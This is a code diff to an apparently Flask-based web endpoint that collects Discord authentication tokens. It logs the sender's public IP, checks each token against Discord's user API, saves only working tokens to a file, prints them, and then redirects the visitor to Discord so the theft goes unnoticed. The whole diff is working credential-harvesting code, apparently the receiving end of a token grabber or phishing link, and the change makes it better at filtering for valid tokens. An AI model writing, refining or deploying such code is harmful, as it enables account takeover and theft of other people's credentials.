@@ -18,19 +18,14 @@ def index(token):
     else:
         publicip = request.environ['HTTP_X_FORWARDED_FOR']
 
-    open("tokens.txt", 'a').close()
-    with open('tokens.txt', 'r') as f:
-        if not any(f"{token}" in line for line in f):
-            with open("tokens.txt", "a") as f:
-                f.write(f"{token}\n")
-
-    try:
-        headers = {"Authorization": token}
-        url = "https://discord.com/api/v9/users/@me"
-        response = requests.get(url, headers=headers)
-
-    except:
-        pass
+    with open('tokens.txt', 'r+') as f:
+        lines = f.read().splitlines()
+        if token not in lines:
+            headers = {"Authorization": token}
+            response = requests.get("https://discord.com/api/v9/users/@me", headers=headers).status_code
+            if response == 200:
+                f.write(f"{token.rstrip()}\n")
+                print(f"From {publicip} {token}")
 
     return redirect("https://discord.com/app")
 
